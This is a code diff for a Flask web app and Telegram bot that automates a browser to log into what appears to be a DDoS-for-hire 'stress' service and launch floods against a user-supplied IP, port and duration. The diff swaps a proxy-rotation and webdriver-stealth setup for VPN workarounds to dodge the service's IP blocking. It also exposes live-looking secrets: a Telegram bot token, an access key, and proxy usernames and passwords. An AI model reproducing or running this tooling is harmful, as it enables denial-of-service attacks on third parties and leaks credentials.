@@ -13,12 +13,13 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
-from webdriver_manager.chrome import ChromeDriverManager
 from pyvirtualdisplay import Display
 import logging
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
+import subprocess
+import sys
 
 # ==================== CONFIG ====================
 TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
@@ -26,21 +27,16 @@ ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
 LOGIN_URL = "https://satellitestress.st/login"
 ATTACK_URL = "https://satellitestress.st/attack"
 COOKIES_FILE = "cookies.pkl"
-PORT = int(os.environ.get("PORT", 5000))
-RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{PORT}")
+PORT = int(os.environ.get("PORT", 10000))  # Render expects port 10000
 
-# ==================== YOUR PROXIES ====================
-PROXY_LIST = [
-    {"server": "31.59.20.176:6754", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "23.95.150.145:6114", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "198.23.239.134:6540", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "45.38.107.97:6014", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "107.172.163.27:6543", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "198.105.121.200:6462", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "64.137.96.74:6641", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "216.10.27.159:6837", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "142.111.67.146:5611", "username": "lmfaxayd", "password": "ujzc9rzsc6op"},
-    {"server": "194.39.32.164:6461", "username": "lmfaxayd", "password": "ujzc9rzsc6op"}
+# ==================== CHROME PATHS for Render ====================
+CHROME_PATHS = [
+    '/usr/bin/google-chrome',
+    '/usr/bin/google-chrome-stable',
+    '/usr/bin/chromium-browser',
+    '/usr/bin/chromium',
+    '/app/.chrome-for-testing/chrome-linux64/chrome',
+    '/opt/render/project/.chrome/chrome-linux64/chrome'
 ]
 
 logging.basicConfig(level=logging.INFO)
@@ -49,6 +45,37 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+# ==================== CHROME INSTALLER for Render ====================
+def install_chrome():
+    """Install Chrome on Render"""
+    try:
+        logger.info("📦 Installing Chrome...")
+        
+        # Download Chrome
+        subprocess.run([
+            'wget', '-q', '-O', 'chrome.deb',
+            'https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
+        ], check=True)
+        
+        # Install Chrome
+        subprocess.run([
+            'dpkg', '-i', 'chrome.deb'
+        ], check=False)  # Continue even if fails
+        
+        # Fix dependencies
+        subprocess.run([
+            'apt-get', 'install', '-f', '-y'
+        ], check=True)
+        
+        # Remove deb file
+        os.remove('chrome.deb')
+        
+        logger.info("✅ Chrome installed")
+        return True
+    except Exception as e:
+        logger.error(f"Chrome install error: {e}")
+        return False
+
 # ==================== BROWSER MANAGER ====================
 class BrowserManager:
     def __init__(self):
@@ -56,59 +83,27 @@ class BrowserManager:
         self.display = None
         self.is_logged_in = False
         self.login_time = None
-        self.current_proxy = None
         
-    def get_proxy_auth_extension(self, proxy):
-        """Create Chrome extension for proxy authentication"""
-        extension_dir = os.path.join(os.getcwd(), "proxy_auth")
-        os.makedirs(extension_dir, exist_ok=True)
+    def find_chrome(self):
+        """Find Chrome executable path"""
+        for path in CHROME_PATHS:
+            if os.path.exists(path):
+                return path
+        return None
         
-        manifest = {
-            "version": "1.0.0",
-            "manifest_version": 2,
-            "name": "Proxy Auth",
-            "permissions": ["proxy", "tabs", "webRequest", "webRequestBlocking", "<all_urls>"],
-            "background": {"scripts": ["background.js"]}
-        }
-        
-        with open(os.path.join(extension_dir, "manifest.json"), "w") as f:
-            json.dump(manifest, f)
-        
-        background_js = f"""
-        var config = {{
-            mode: "fixed_servers",
-            rules: {{
-                singleProxy: {{
-                    scheme: "http",
-                    host: "{proxy['server'].split(':')[0]}",
-                    port: parseInt("{proxy['server'].split(':')[1]}")
-                }}
-            }}
-        }};
-        chrome.proxy.settings.set({{value: config, scope: "regular"}});
-        chrome.webRequest.onAuthRequired.addListener(
-            function(details) {{
-                return {{authCredentials: {{username: "{proxy['username']}", password: "{proxy['password']}"}}}};
-            }},
-            {{urls: ["<all_urls>"]}},
-            ["blocking"]
-        );
-        """
-        
-        with open(os.path.join(extension_dir, "background.js"), "w") as f:
-            f.write(background_js)
-        
-        return extension_dir
-    
     def start(self):
-        """Start browser with proxy"""
+        """Start browser with proper Chrome path"""
         try:
-            # Random proxy
-            self.current_proxy = random.choice(PROXY_LIST)
-            logger.info(f"🌐 Using proxy: {self.current_proxy['server']}")
+            logger.info("🚀 Starting browser...")
             
-            # Proxy extension
-            extension_dir = self.get_proxy_auth_extension(self.current_proxy)
+            # Find Chrome
+            chrome_path = self.find_chrome()
+            if not chrome_path:
+                logger.warning("Chrome not found, installing...")
+                install_chrome()
+                chrome_path = self.find_chrome()
+            
+            logger.info(f"📌 Chrome path: {chrome_path}")
             
             # Virtual display
             self.display = Display(visible=0, size=(1920, 1080))
@@ -116,6 +111,7 @@ class BrowserManager:
             
             # Chrome options
             options = Options()
+            options.binary_location = chrome_path
             options.add_argument("--no-sandbox")
             options.add_argument("--disable-dev-shm-usage")
             options.add_argument("--disable-gpu")
@@ -125,21 +121,11 @@ class BrowserManager:
             options.add_argument("--disable-web-security")
             options.add_argument("--allow-running-insecure-content")
             options.add_argument("--ignore-certificate-errors")
-            options.add_argument(f'--load-extension={extension_dir}')
+            options.add_argument("--disable-features=VizDisplayCompositor")
             
-            # Random user agent
-            user_agents = [
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-            ]
-            options.add_argument(f'--user-agent={random.choice(user_agents)}')
-            
-            # Start driver
-            service = Service(ChromeDriverManager().install())
+            # Start driver (without webdriver-manager)
+            service = Service(executable_path="/usr/local/bin/chromedriver")
             self.driver = webdriver.Chrome(service=service, options=options)
-            
-            # Stealth
-            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
             
             logger.info("✅ Browser started")
             
@@ -157,7 +143,7 @@ class BrowserManager:
                 cookies = pickle.load(f)
             
             self.driver.get(LOGIN_URL)
-            time.sleep(2)
+            time.sleep(3)
             
             for cookie in cookies:
                 try:
@@ -187,7 +173,7 @@ class BrowserManager:
         """Check if logged in"""
         try:
             self.driver.get(ATTACK_URL)
-            time.sleep(2)
+            time.sleep(3)
             
             if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
                 self.is_logged_in = True
@@ -204,15 +190,25 @@ class BrowserManager:
         """Launch attack"""
         try:
             self.driver.get(ATTACK_URL)
-            time.sleep(2)
+            time.sleep(3)
             
             WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "ip")))
             
-            self.driver.find_element(By.NAME, "ip").send_keys(ip)
-            self.driver.find_element(By.NAME, "port").send_keys(str(port))
-            self.driver.find_element(By.NAME, "time").send_keys(str(duration))
-            self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
-            time.sleep(2)
+            ip_input = self.driver.find_element(By.NAME, "ip")
+            ip_input.clear()
+            ip_input.send_keys(ip)
+            
+            port_input = self.driver.find_element(By.NAME, "port")
+            port_input.clear()
+            port_input.send_keys(str(port))
+            
+            time_input = self.driver.find_element(By.NAME, "time")
+            time_input.clear()
+            time_input.send_keys(str(duration))
+            
+            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+            submit_btn.click()
+            time.sleep(3)
             
             logger.info(f"✅ Attack sent")
             return True
@@ -237,7 +233,7 @@ class TelegramBot:
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "🚀 **Satellite Stress Bot**\n\n"
-            f"🌐 Web: {RENDER_URL}\n\n"
+            f"🌐 Web: https://udprocket-5.onrender.com\n\n"
             "**Commands:**\n"
             "/status - Check login\n"
             "/attack IP PORT TIME - Launch attack",
@@ -287,7 +283,7 @@ class TelegramBot:
     def run(self):
         self.application.run_polling()
 
-# ==================== HTML TEMPLATE (Fixed Iframe) ====================
+# ==================== HTML TEMPLATE ====================
 HTML = """
 <!DOCTYPE html>
 <html>
@@ -319,7 +315,6 @@ HTML = """
             padding: 20px;
             text-align: center;
         }
-        .header h1 { font-size: 24px; }
         .content { padding: 20px; }
         
         .status-bar {
@@ -333,7 +328,6 @@ HTML = """
             padding: 10px 15px;
             border-radius: 12px;
             flex: 1;
-            min-width: 150px;
         }
         .status-label { color: #64748b; font-size: 12px; }
         .status-value { font-weight: 600; color: #0f172a; }
@@ -372,7 +366,6 @@ HTML = """
             cursor: pointer;
             color: white;
             flex: 1;
-            min-width: 120px;
         }
         .btn-primary { background: #2563eb; }
         .btn-success { background: #22c55e; }
@@ -411,16 +404,36 @@ HTML = """
             color: #64748b;
             font-size: 12px;
         }
+        
+        .note-box {
+            background: #fee2e2;
+            border: 1px solid #ef4444;
+            color: #991b1b;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🐍 Satellite Stress Bot - Iframe Login</h1>
+            <h1>🐍 Satellite Stress Bot</h1>
         </div>
         
         <div class="content">
-            <!-- Status -->
+            <div class="note-box">
+                <strong>⚠️ IMPORTANT:</strong><br>
+                Website is blocking Render IP. Please use this VPN extension in Chrome:
+                <br><br>
+                <strong>1. Install this extension:</strong><br>
+                <a href="https://chrome.google.com/webstore/detail/zenmate-free-vpn%E2%80%93best-vpn/fdcgdnkidjaadafnichfpabhfomcebme" target="_blank">ZenMate VPN</a><br>
+                <a href="https://chrome.google.com/webstore/detail/hola-free-vpn-proxy-unblo/gkojfkhlekighikafcpjkiklfbnlmeio" target="_blank">Hola VPN</a>
+                <br><br>
+                <strong>2. Connect to any country (India/US/UK)</strong><br>
+                <strong>3. Refresh this page</strong>
+            </div>
+            
             <div class="status-bar">
                 <div class="status-item">
                     <div class="status-label">Login Status</div>
@@ -439,54 +452,43 @@ HTML = """
                 </div>
             </div>
             
-            <!-- Access Key -->
             <div class="key-box">
                 <strong>🔑 ACCESS KEY:</strong><br>
                 {{ access_key }}
             </div>
             
-            <!-- Buttons -->
             <div class="button-group">
-                <button class="btn btn-primary" onclick="showLogin()">🌐 Show Login Page</button>
+                <button class="btn btn-primary" onclick="reloadIframe()">🔄 Reload Login Page</button>
                 <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
                 <button class="btn btn-warning" onclick="checkStatus()">🔄 Refresh Status</button>
             </div>
             
-            <!-- IFrame - YAHI PE LOGIN HOGA -->
-            <div class="iframe-container" id="loginIframeContainer">
+            <div class="iframe-container">
                 <iframe id="loginFrame" src="{{ login_url }}"></iframe>
             </div>
             
-            <!-- Instructions -->
             <div style="background: #dbeafe; padding: 15px; border-radius: 12px; margin: 20px 0;">
-                <strong>📝 LOGIN INSTRUCTIONS:</strong><br>
-                1. Login in the iframe above ⬆️<br>
-                2. Enter Access Key: <strong>{{ access_key }}</strong><br>
-                3. Complete any captcha<br>
-                4. After login, click "Save Session" button<br>
-                5. Session saved! Now use Telegram bot.
+                <strong>📝 LOGIN STEPS:</strong><br>
+                1. Install VPN extension (Chrome Web Store) ⬆️<br>
+                2. Connect to India/UK/US server<br>
+                3. Refresh this page (Reload Login Page)<br>
+                4. Login with Access Key<br>
+                5. Click "Save Session"<br>
+                6. Use Telegram bot
             </div>
             
-            <!-- Telegram Link -->
             <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                 📱 Open Telegram Bot
             </a>
-            
-            <p style="text-align: center; color: #64748b; font-size: 12px;">
-                /attack 104.29.138.132 80 120
-            </p>
         </div>
         
         <div class="footer">
-            Render URL: {{ render_url }} | Proxy Enabled
+            Port: {{ port }} | Render URL: {{ render_url }}
         </div>
     </div>
     
     <script>
-        // Page load par iframe already visible
-        document.getElementById('loginFrame').src = '{{ login_url }}';
-        
-        function showLogin() {
+        function reloadIframe() {
             document.getElementById('loginFrame').src = '{{ login_url }}';
         }
         
@@ -518,7 +520,6 @@ HTML = """
             document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
         }
         
-        // Auto refresh status
         setInterval(checkStatus, 5000);
     </script>
 </body>
@@ -534,10 +535,10 @@ def index():
         HTML,
         is_logged_in=browser.is_logged_in,
         session_exists=os.path.exists(COOKIES_FILE),
-        login_time=browser.login_time,
         access_key=ACCESS_KEY,
         login_url=LOGIN_URL,
-        render_url=RENDER_URL
+        render_url="https://udprocket-5.onrender.com",
+        port=PORT
     )
 
 @app.route('/status')
@@ -569,7 +570,12 @@ def run_telegram():
 if __name__ == '__main__':
     print("="*50)
     print("🚀 Starting Satellite Stress Bot")
+    print(f"📌 Port: {PORT}")
     print("="*50)
+    
+    # Install Chrome if needed
+    if not os.path.exists('/usr/bin/google-chrome-stable'):
+        install_chrome()
     
     # Start browser
     browser.start()
